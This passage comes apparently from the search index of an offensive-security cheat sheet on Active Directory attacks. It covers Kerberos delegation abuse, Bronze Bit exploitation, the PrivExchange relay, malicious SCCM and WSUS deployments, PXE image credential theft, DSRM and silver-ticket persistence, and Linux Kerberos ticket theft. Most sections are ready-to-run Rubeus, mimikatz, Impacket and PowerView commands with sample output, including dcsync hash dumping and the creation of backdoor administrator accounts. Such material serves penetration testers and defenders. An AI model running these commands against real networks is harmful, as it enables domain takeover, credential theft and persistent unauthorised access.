/ticket:... $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:\"cifs/dc.domain.com\" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt $ dir \\\\dc.domain.com\\c$","title":"Exploit the Constrained Delegation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#impersonate-a-domain-user-on-a-resource","text":"Require: * SYSTEM level privileges on a machine configured with constrained delegation PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator') PS> $idToImpersonate.Impersonate() PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name PS> ls \\\\dc01.offense.local\\c$","title":"Impersonate a domain user on a resource"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-resource-based-constrained-delegation","text":"Resource-based Constrained Delegation was introduced in Windows Server 2012. The user sends a TGS to access the service (\"Service A\"), and if the service is allowed to delegate to another pre-defined service (\"Service B\"), then Service A can present to the authentication service the TGS that the user provided and obtain a TGS for the user to Service B. https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Import Powermad and Powerview powershell PowerShell.exe -ExecutionPolicy Bypass Import-Module .\\powermad.ps1 Import-Module .\\powerview.ps1 Get user SID powershell $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID} $ACE ConvertFrom-SID $ACE.SecurityIdentifier Abuse MachineAccountQuota to create a computer account and set an SPN for it powershell New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force) Rewrite DC's AllowedToActOnBehalfOfOtherIdentity properties powershell $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 $Descriptor.DiscretionaryAcl ```ps1","title":"Kerberos Resource Based Constrained Delegation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#alternative","text":"$SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}","title":"alternative"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#alternative_1","text":"StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND ``` Use Rubeus to get hash from password powershell Rubeus.exe hash /password:'Weakest123*' /user:swktest$ /domain:factory.lan [*] Input password : Weakest123* [*] Input username : swktest$ [*] Input domain : factory.lan [*] Salt : FACTORY.LANswktest [*] rc4_hmac : F8E064CA98539B735600714A1F1907DD [*] aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498 [*] aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 [*] des_cbc_md5 : BA297CFD07E62A5E Impersonate domain admin using our newly created machine account ```powershell .\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap .\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap [ ] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan' [ ] Using domain controller: DC01-WW2.factory.lan (172.16.42.5) [ ] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan' [ ] Sending S4U2proxy request [+] S4U2proxy success! [*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan': doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE LmZhY3RvcnkubGFu [*] Action: Import Ticket [+] Ticket successfully imported! ```","title":"alternative"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-bronze-bit-attack-cve-2020-17049","text":"An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated . Patch is out on November 10, 2020, DC are most likely vulnerable until February 2021 . :warning: Patched Error Message : [-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified) Requirements: * Service account's password hash * Service account's with Constrained Delegation or Resource Based Constrained Delegation * Impacket PR #1013 Attack #1 - Bypass the Trust this user for delegation to specified services only \u2013 Use Kerberos only protection and impersonate a user who is protected from delegation. # forwardable flag is only protected by the ticket encryption which uses the service account's password $ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller> # -> Forwardable $ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable # Load the ticket .\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit # Access \"c$\" ls \\\\service2.test.local\\c$ Attack #2 - Write Permissions to one or more objects in the AD # Create a new machine account Import-Module .\\Powermad\\powermad.ps1 New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force) .\\mimikatz\\mimikatz.exe \"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\" exit # Set PrincipalsAllowedToDelegateToAccount Install-WindowsFeature RSAT-AD-PowerShell Import-Module ActiveDirectory Get-ADComputer AttackerService Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount # Execute the attack python .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ # Load the ticket .\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit | Out-Null","title":"Kerberos Bronze Bit Attack - CVE-2020-17049"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#privexchange-attack","text":"Exchange your privileges for Domain Admin privs by abusing Exchange. :warning: You need a shell on a user account with a mailbox. Exchange server hostname or IP address bash pth-net rpc group members \"Exchange Servers\" -I dc01.domain.local -U domain/username Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket). powershell ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine. ```bash","title":"PrivExchange attack"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#httpsgithubcomdirkjanmprivexchangeblobmasterprivexchangepy","text":"python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange","title":"https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#httpsgithubcomg0ldengunsecpowerpriv","text":"powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016 ``` Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash bash python secretsdump.py xxxxxxxxxx -just-dc python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm Clean your mess and restore a previous state of the user's ACL powershell python aclpwn.py --restore ../aclpwn-20190319-125741.restore Alternatively you can use the Metasploit module use auxiliary/scanner/http/exchange_web_server_pushsubscription Alternatively you can use an all-in-one tool : Exchange2domain. git clone github.com/Ridter/Exchange2domain python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip","title":"https://github.com/G0ldenGunSec/PowerPriv"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#sccm-deployment","text":"SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation. PowerSCCM - PowerShell module to interact with SCCM deployments MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage Compromise client, use locate to find management server ps1 MalSCCM.exe locate Enumerate over WMI as an administrator of the Distribution Point ps1 MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups Compromise management server, use locate to find primary server use Inspect on primary server to view who you can target ps1 MalSCCM.exe inspect /all MalSCCM.exe inspect /computers MalSCCM.exe inspect /primaryusers MalSCCM.exe inspect /groups Create a new device group for the machines you want to laterally move too ps1 MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device MalSCCM.exe inspect /groups Add your targets into the new group ps1 MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL Create an application pointing to a malicious EXE on a world readable share : SCCMContentLib$ ps1 MalSCCM.exe app /create /name:demoapp /uncpath:\"\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\" MalSCCM.exe inspect /applications Deploy the application to the target group ps1 MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment MalSCCM.exe inspect /deployments Force the target group to checkin for updates ps1 MalSCCM.exe checkin /groupname:TargetGroup Cleanup the application, deployment and group ps1 MalSCCM.exe app /cleanup /name:demoapp MalSCCM.exe group /delete /groupname:TargetGroup","title":"SCCM Deployment"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#wsus-deployment","text":"Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network :warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary. SharpWSUS Locate using HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate or SharpWSUS.exe locate After WSUS Server compromise: SharpWSUS.exe inspect Create a malicious patch: SharpWSUS.exe create /payload:\"C:\\Users\\ben\\Documents\\pk\\psexec.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\\\"\" /title:\"WSUSDemo\" Deploy it on the target: SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\"Demo Group\" Check status deployment: SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local Clean up: SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\u201dDemo Group","title":"WSUS Deployment"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#rodc-read-only-domain-controller-compromise","text":"If the user is included in the Allowed RODC Password Replication , their credentials are stored in the server, and the msDS-RevealedList attribute of the RODC is populated with the username. Requirements : * Impacket PR #1210 - The Kerberos Key List Attack * krbtgt credentials of the RODC (-rodcKey) * ID of the krbtgt account of the RODC (-rodcNo) Exploitation : # keylistattack.py using SAMR user enumeration without filtering (-full flag) keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full # keylistattack.py defining a target username (-t flag) keylistattack.py -kdc sever.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST # secretsdump.py using the Kerberos Key List Attack option (-use-keylist) secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist","title":"RODC - Read Only Domain Controller Compromise"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pxe-boot-image-attack","text":"PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it. Press [F8] during the PXE boot to spawn an administrator console on the deployed machine. Press [SHIFT+F10] during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry. powershell net user hacker Password123! /add net localgroup administrators /add hacker Extract the pre-boot image (wim files) using PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts. ```powershell","title":"PXE Boot image attack"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#import-the-module","text":"PS > Import-Module .\\PowerPXE.ps1","title":"Import the module"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#start-the-exploit-on-the-ethernet-interface","text":"PS > Get-PXEcreds -InterfaceAlias Ethernet PS > Get-PXECreds -InterfaceAlias \u00ab lab 0 \u00bb","title":"Start the exploit on the Ethernet interface"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#wait-for-the-dhcp-to-get-an-address","text":"Get a valid IP address DHCP proposal IP address: 192.168.22.101 DHCP Validation: DHCPACK IP address configured: 192.168.22.101","title":"Wait for the DHCP to get an address"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-bcd-path-from-the-dhcp-response","text":"Request BCD File path BCD File path: \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd TFTP IP Address: 192.168.22.3","title":"Extract BCD path from the DHCP response"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#download-the-bcd-file-and-extract-wim-files","text":"Launch TFTP download Transfer succeeded. Parse the BCD file: conf.bcd Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim Launch TFTP download Transfer succeeded.","title":"Download the BCD file and extract wim files"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#parse-wim-files-to-find-interesting-data","text":"Open LiteTouchPE_x86.wim Finding Bootstrap.ini DeployRoot = \\LAB-MDT\\DeploymentShare$ UserID = MdtService UserPassword = Somepass1 ```","title":"Parse wim files to find interesting data"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dns-reconnaissance","text":"Perform ADIDNS searches StandIn.exe --dns --limit 20 StandIn.exe --dns --filter SQL --limit 10 StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e","title":"DNS Reconnaissance"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dsrm-credentials","text":"Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database. This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user. Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' # Check if the key exists and get the value Get-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior # Create key with value \"2\" if it doesn't exist New-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD # Change value to \"2\" Set-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2","title":"DSRM Credentials"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#impersonating-office-365-users-on-azure-ad-connect","text":"Prerequisites: Obtain NTLM password hash of the AZUREADSSOACC account powershell mimikatz.exe \"lsadump::dcsync /user:AZUREADSSOACC$\" exit AAD logon name of the user we want to impersonate (userPrincipalName or mail) powershell elrond@contoso.com SID of the user we want to impersonate powershell S-1-5-21-2121516926-2695913149-3163778339-1234 Create the Silver Ticket and inject it into Kerberos cache: mimikatz.exe \"kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\" exit Launch Mozilla Firefox, go to about:config network.negotiate-auth.trusted-uris=\"https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com\". Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.","title":"Impersonating Office 365 Users on Azure AD Connect"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#linux-active-directory","text":"","title":"Linux Active Directory"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-tmp","text":"When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions List the current ticket used for authentication with env | grep KRB5CCNAME . The format is portable and the ticket can be reused by setting the environment variable with export KRB5CCNAME=/tmp/ticket.ccache . Kerberos ticket name format is krb5cc_%{uid} where uid is the user UID. $ ls /tmp/ | grep krb5cc krb5cc_1000 krb5cc_1569901113 krb5cc_1569901115 $ export KRB5CCNAME=/tmp/krb5cc_1569901115","title":"CCACHE ticket reuse from /tmp"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-keyring","text":"Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey # Configuration and build git clone https://github.com/TarlogicSecurity/tickey cd tickey/tickey make CONF=Release [root@Lab-LSV01 /]# /tmp/tickey -i [*] krb5 ccache_name = KEYRING:session:sess_%{uid} [+] root detected, so... DUMP ALL THE TICKETS!! [*] Trying to inject in tarlogic[1000] session... [+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache [*] Trying to inject in velociraptor[1120601115] session... [+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache [*] Trying to inject in trex[1120601113] session... [+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache [X] [uid:0] Error retrieving tickets","title":"CCACHE ticket reuse from keyring"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-sssd-kcm","text":"SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb . The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey . By default, the key is only readable if you have root permissions. Invoking SSSDKCMExtractor with the --database and --key parameters will parse the database and decrypt the secrets. git clone https://github.com/fireeye/SSSDKCMExtractor python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.","title":"CCACHE ticket reuse from SSSD KCM"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ccache-ticket-reuse-from-keytab","text":"git clone https://github.com/its-a-feature/KeytabParser python KeytabParser.py /etc/krb5.keytab klist -k /etc/krb5.keytab","title":"CCACHE ticket reuse from keytab"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-accounts-from-etckrb5keytab","text":"The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. Use klist to read the keytab file and parse its content. The key that you see when the key type is 23 is the actual NT Hash of the user. $ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab [...] [26] Service principal: host/COMPUTER@DOMAIN KVNO: 25 Key type: 23 Key: 31d6cfe0d16ae931b73c59d7e0c089c0 Time stamp: Oct 07, 2019 09:12:02 [...] On Linux you can use KeyTabExtract : we want RC4 HMAC hash to reuse the NLTM hash. $ python3 keytabextract.py krb5.keytab [!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck [+] Keytab File successfully imported. REALM : DOMAIN SERVICE PRINCIPAL : host/computer.domain NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky On macOS you can use bifrost . ./bifrost -action dump -source keytab -path test Connect to the machine using the account and the hash with CME. $ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H \"31d6cfe0d16ae931b73c59d7e0c089c0\" -d \"DOMAIN\" CME 10.XXX.XXX.XXX:445 HOSTNAME-01 [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0","title":"Extract accounts from /etc/krb5.keytab"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#references","text":"Explain like I\u2019m 5: Kerberos - Apr 2, 2013 - @roguelynn Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema Abusing Kerberos: Kerberoasting - Haboob Team Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 & @5ub34x Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh BlueHat IL - Benjamin Delpy COMPROMISSION DES POSTES DE TRAVAIL GR\u00c2CE \u00c0 LAPS ET PXE MISC n\u00b0 103 - mai 2019 - R\u00e9mi Escourrou, Cyprien Oger Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss DiskShadow The return of VSS Evasion Persistence and AD DB extraction Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin Dumping Domain Password Hashes - Pentestlab Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace Exploiting PrivExchange - April 11, 2019 - @chryzsh Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019 Finding Passwords in SYSVOL & Exploiting Group Policy Preferences How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf Fun with LDAP, Kerberos (and MSRPC) in AD Environments Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r Golden ticket - Pentestlab How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018 Invoke-Kerberoast - Powersploit Read the docs Kerberoasting - Part 1 - Mubix \u201cRob\u201d Fuller Passing the hash with native RDP client (mstsc.exe) Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView) Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView Pen Testing Active Directory Environments - Part III: Chasing Power Users Pen Testing Active Directory Environments - Part IV: Graph Fun Pen Testing Active Directory Environments - Part V: Admins and Graphs Pen Testing Active Directory Environments - Part VI: The Final Case Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave Roasting AS-REPs - January 17, 2017 - harmj0y Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher Using bloodhound to map the user network - Hausec WHAT\u2019S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 1 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 2 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 3 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 4 WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 5 Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami [PrivExchange] From user to domain admin in less than 60sec ! - davy Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY P\u00c9REZ Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018 Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon Playing with Relayed Credentials - June 27, 2018 Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019 How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous SMB Share \u2013 SCF File Attacks - December 13, 2017 - @netbiosX Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema A Red Teamer\u2019s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0 Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10 Active-Directory-Exploitation-Cheat-Sheet - @buftas GPO Abuse - Part 1 - RastaMouse - 6 January 2019 GPO Abuse - Part 2 - RastaMouse - 13 January 2019 Abusing GPO Permissions - harmj0y - March 17, 2016 How To Attack Kerberos 101 - m0chan - July 31, 2019 ACE to RCE - @JustinPerdok - July 24, 2020 Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020 Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Practical Exploitation - Jake Karnes - December 8th, 2020 CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Theory - Jake Karnes - December 8th, 2020 Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory GPO Abuse: \"You can't see me\" - Huy Kha - July 19, 2019 Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017 New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018 Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17 Playing with PrintNightmare - 0xdf - Jul 8, 2021 Attacking Active Directory: 0 to 0.9 - Eloy P\u00e9rez Gonz\u00e1lez - 2021/05/29 Microsoft ADCS \u2013 Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021 Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021 NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_ Certified Pre-Owned - Will Schroeder - Jun 17 2021 AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021 NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021 UnPAC the hash - The Hacker Recipes Lateral Movement \u2013 WebClient Shadow Credentials: Workstation Takeover Edition - Matthew Creel Certificate templates - The Hacker Recipes CA configuration - The Hacker Recipes Access controls - The Hacker Recipes Web endpoints - The Hacker Recipes sAMAccountName spoofing - The Hacker Recipes CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph ADCS: Playing with ESC4 - Matthew Creel The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022 AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Mart\u00ednez, Kurosh Dabbagh Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022 Introducing MalSCCM - Phil Keeble -May 4, 2022 Certifried: Active Directory Domain Privilege Escalation (CVE-2022\u201326923) - Oliver Lyak bloodyAD and CVE-2022-26923 - soka - 11 May 2022 DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil 